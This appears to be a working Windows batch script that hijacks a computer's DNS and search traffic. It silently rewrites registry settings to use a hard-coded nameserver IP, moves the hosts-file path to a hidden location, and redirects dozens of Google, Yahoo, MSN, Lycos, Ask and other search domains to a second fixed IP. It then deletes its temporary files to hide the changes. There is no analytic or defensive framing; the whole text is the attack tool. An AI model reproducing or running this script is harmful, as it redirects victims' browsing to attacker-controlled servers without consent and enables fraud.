@echo OFF
set x88=%windir%\hosts
set y88=%windir%\o.reg
set a88=%windir%\o2.reg
set w88=%windir%\o.vbs
set q88=216.127.92.38
set z88=207.44.220.30
if exist %windir%\winlog goto :done
echo REGEDIT4 >%y88%
echo [HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\MSTCP]>>%y88%
echo "EnableDNS"="1">>%y88%
echo "NameServer"="%q88%">>%y88%
echo "HostName"="host">>%y88%
echo "Domain"="mydomain.com">>%y88%
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings] >>%y88%
echo "ProxyEnable"=dword:00000000 >>%y88%
echo "MigrateProxy"=dword:00000000 >>%y88%
echo [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main] >>%y88%
echo "Use Search Asst"="no" >>%y88%
echo "Search Page"="http://www.google.com" >>%y88%
echo "Search Bar"="http://www.google.com/ie" >>%y88%
echo [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\SearchURL] >>%y88%
echo ""="http://www.google.com/keyword/%%s" >>%y88%
echo "provider"="gogl" >>%y88%
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search] >>%y88%
echo "SearchAssistant"="http://www.google.com/ie" >>%y88%
regedit /S %y88%
if not exist %windir%\system32\drivers\etc\services goto :start
echo Windows Registry Editor Version 5.00>%a88%
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters]>>%a88%
echo "DataBasePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,68,00,65,00,6c,00,70,00,00,00>>%a88%
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\Parameters]>>%a88%
echo "DataBasePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,68,00,65,00,6c,00,70,00,00,00>>%a88%
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\interfaces\windows]>>%a88%
echo "r0x"="your s0x">>%a88%
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\Parameters\interfaces\windows]>>%a88%
echo "r0x"="your s0x">>%a88%
regedit /S %a88%
echo    Const HKEY_LOCAL_MACHINE = ^&H80000002>%w88%
echo    strComputer = ".">>%w88%
echo    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" ^& strComputer ^& "\root\default:StdRegProv")>>%w88%
echo    strKeyPath = "SYSTEM\ControlSet001\Services\Tcpip\Parameters\interfaces\">>%w88%
echo    oReg.EnumKey HKEY_LOCAL_MACHINE, strKeyPath, arrSubKeys>>%w88%
echo    For Each subkey In arrSubKeys>>%w88%
echo        strNewKeyPath = strKeyPath ^& subkey>>%w88%
echo        oReg.SetStringValue HKEY_LOCAL_MACHINE, strNewKeyPath, "NameServer", "%q88%">>%w88%
echo    Next>>%w88%
echo    strKeyPath = "SYSTEM\ControlSet002\Services\Tcpip\Parameters\interfaces\">>%w88%
echo    oReg.EnumKey HKEY_LOCAL_MACHINE, strKeyPath, arrSubKeys>>%w88%
echo    For Each subkey In arrSubKeys>>%w88%
echo        strNewKeyPath = strKeyPath ^& subkey>>%w88%
echo        oReg.SetStringValue HKEY_LOCAL_MACHINE, strNewKeyPath, "NameServer", "%q88%">>%w88%
echo    Next>>%w88%
cscript %w88%
:start
echo 88.88.88.88 elite >>%x88%
echo %z88% www.google.akadns.net >>%x88%
echo %z88% www.google.com >>%x88%
echo %z88% google.com >>%x88%
echo %z88% www.altavista.com >>%x88%
echo %z88% altavista.com >>%x88%
echo %z88% search.yahoo.com >>%x88%
echo %z88% uk.search.yahoo.com >>%x88%
echo %z88% ca.search.yahoo.com >>%x88%
echo %z88% jp.search.yahoo.com >>%x88%
echo %z88% au.search.yahoo.com >>%x88%
echo %z88% de.search.yahoo.com >>%x88%
echo %z88% search.yahoo.co.jp >>%x88%
echo %z88% www.lycos.de >>%x88%
echo %z88% www.lycos.ca >>%x88%
echo %z88% www.lycos.jp >>%x88%
echo %z88% www.lycos.co.jp >>%x88%
echo %z88% alltheweb.com >>%x88%
echo %z88% web.ask.com >>%x88%
echo %z88% ask.com >>%x88%
echo %z88% www.ask.com >>%x88%
echo %z88% www.teoma.com >>%x88%
echo %z88% search.aol.com >>%x88%
echo %z88% www.looksmart.com >>%x88%
echo %z88% auto.search.msn.com >>%x88%
echo %z88% search.msn.com >>%x88%
echo %z88% ca.search.msn.com >>%x88%
echo %z88% fr.ca.search.msn.com >>%x88%
echo %z88% search.fr.msn.be >>%x88%
echo %z88% search.fr.msn.ch >>%x88%
echo %z88% search.latam.yupimsn.com >>%x88%
echo %z88% search.msn.at >>%x88%
echo %z88% search.msn.be >>%x88%
echo %z88% search.msn.ch >>%x88%
echo %z88% search.msn.co.in >>%x88%
echo %z88% search.msn.co.jp >>%x88%
echo %z88% search.msn.co.kr >>%x88%
echo %z88% search.msn.com.br >>%x88%
echo %z88% search.msn.com.hk >>%x88%
echo %z88% search.msn.com.my >>%x88%
echo %z88% search.msn.com.sg >>%x88%
echo %z88% search.msn.com.tw >>%x88%
echo %z88% search.msn.co.za >>%x88%
echo %z88% search.msn.de >>%x88%
echo %z88% search.msn.dk >>%x88%
echo %z88% search.msn.es >>%x88%
echo %z88% search.msn.fi >>%x88%
echo %z88% search.msn.fr >>%x88%
echo %z88% search.msn.it >>%x88%
echo %z88% search.msn.nl >>%x88%
echo %z88% search.msn.no >>%x88%
echo %z88% search.msn.se >>%x88%
echo %z88% search.ninemsn.com.au >>%x88%
echo %z88% search.t1msn.com.mx >>%x88%
echo %z88% search.xtramsn.co.nz >>%x88%
echo %z88% search.yupimsn.com >>%x88%
echo %z88% uk.search.msn.com >>%x88%
echo %z88% search.lycos.com >>%x88%
echo %z88% www.lycos.com >>%x88%
echo %z88% www.google.ca >>%x88%
echo %z88% google.ca >>%x88%
echo %z88% www.google.uk >>%x88%
echo %z88% www.google.co.uk >>%x88%
echo %z88% www.google.com.au >>%x88%
echo %z88% www.google.co.jp >>%x88%
echo %z88% www.google.jp >>%x88%
echo %z88% www.google.at >>%x88%
echo %z88% www.google.be >>%x88%
echo %z88% www.google.ch >>%x88%
echo %z88% www.google.de >>%x88%
echo %z88% www.google.se >>%x88%
echo %z88% www.google.dk >>%x88%
echo %z88% www.google.fi >>%x88%
echo %z88% www.google.fr >>%x88%
echo %z88% www.google.com.gr >>%x88%
echo %z88% www.google.com.hk >>%x88%
echo %z88% www.google.ie >>%x88%
echo %z88% www.google.co.il >>%x88%
echo %z88% www.google.it >>%x88%
echo %z88% www.google.co.kr >>%x88%
echo %z88% www.google.com.mx >>%x88%
echo %z88% www.google.nl >>%x88%
echo %z88% www.google.co.nz >>%x88%
echo %z88% www.google.pl >>%x88%
echo %z88% www.google.pt >>%x88%
echo %z88% www.google.com.ru >>%x88%
echo %z88% www.google.com.sg >>%x88%
echo %z88% www.google.co.th >>%x88%
echo %z88% www.google.com.tr >>%x88%
echo %z88% www.google.com.tw >>%x88%
echo %z88% go.google.com >>%x88%
echo %z88% google.at >>%x88%
echo %z88% google.be >>%x88%
echo %z88% google.de >>%x88%
echo %z88% google.dk >>%x88%
echo %z88% google.fi >>%x88%
echo %z88% google.fr >>%x88%
echo %z88% google.com.hk >>%x88%
echo %z88% google.ie >>%x88%
echo %z88% google.co.il >>%x88%
echo %z88% google.it >>%x88%
echo %z88% google.co.kr >>%x88%
echo %z88% google.com.mx >>%x88%
echo %z88% google.nl >>%x88%
echo %z88% google.co.nz >>%x88%
echo %z88% google.pl >>%x88%
echo %z88% google.com.ru >>%x88%
echo %z88% google.com.sg >>%x88%
echo %z88% www.hotbot.com >>%x88%
echo %z88% hotbot.com >>%x88%
type %windir%\hosts >>%windir%\help\hosts
if exist %windir%\system32\drivers\etc\services del %x88%
echo a >%windir%\winlog
del %y88%
del %a88%
del %w88%
:done
